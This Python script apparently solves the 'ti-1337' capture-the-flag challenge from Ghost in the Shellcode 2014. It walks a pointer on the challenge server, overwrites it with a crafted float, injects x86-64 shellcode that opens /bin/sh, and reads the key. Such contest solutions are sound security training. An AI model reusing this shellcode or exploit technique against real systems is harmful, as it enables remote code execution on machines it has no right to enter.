__author__ = 'HuyNA'

"""
    Points: 100

    Find the key! File running at ti-1337.2014.ghostintheshellcode.com
"""
import sys
import os
import socket
import time

def recv_until(sock, delim):
    buf = ""
    while True:
        c = sock.recv(1)
        buf += c
        if delim in buf:
            break
    return buf

shellcode = "\x6a\x04\x5f\x48\x31\xf6\x48\x31\xc0\xb0\x21\x0f\x05\x48\x31\xc0\xb0\x21\x48\xff\xc6\x0f\x05\x48\x31\xc0\xb0\x21\x48\xff\xc6\x0f\x05\x48\x31\xf6\x48\x31\xd2\x52\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xc0\xb0\x3b\x0f\x05" + "\n"

jmp_rax_address = 0x0000000000400CE7

sscanf_address = 0x006030B8
float_pool_address = 0x0000000000603140
loop_count = float_pool_address - sscanf_address
loop_count = loop_count // 8 + 2 + 18

# 0000000000401A6C 9D FB FF FF                         dd 0FFFFFB9Dh


# :0000000000401B48 B0 FD FF FF                         dd 0FFFFFDB0h => print value
# .rodata:0000000000401A44 22 FD FF FF                 dword_401A44 dd 0FFFFFD22h              ; DATA XREF: a_MainProcessPerClient+61o
change_pointer = (0x0000000000401B48 - 0x0000000000401A44) // 4 + 0x21

# .rodata:0000000000401B4C 0E FE FF FF                         dd 0FFFFFE0Eh    => reset stack
change_pointer = (0x0000000000401B4C - 0x0000000000401A44) // 4 + 0x21

data_change_pointer = "b\n"
reset_stack_pointer = "c\n"

float_string = "2.0738935e-317\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#184.175.99.226 9090
host = "ti-1337.2014.ghostintheshellcode.com"
local_host="192.168.248.154"
port = 31415
s.connect((host, port))



#print("Reset stack count .... ")
#s.send(reset_stack_pointer)
#print(recv_until(s, "\n"))

print("Change pointer to place to overwrite ... ")
for i in xrange(loop_count):
    s.send(data_change_pointer)
    print(recv_until(s, "\n"))


print("Push controlled value and Overwrite ... ")
s.send(float_string)

print("Send shellcode and run ... ")
s.send(shellcode)

s.send("cat key \n")

while True:
    data = s.recv(1024)
    print(data)
#print(s.recv(10240))
#print(s.recv(10240))


"""
b *0x00000000004017F4
b *0x000000000040189A
b *0x000000000401537
b *0x000400CE7
set follow-fork-mode child
set detach-on-fork off
000603140
0000401421 call sscanf
"""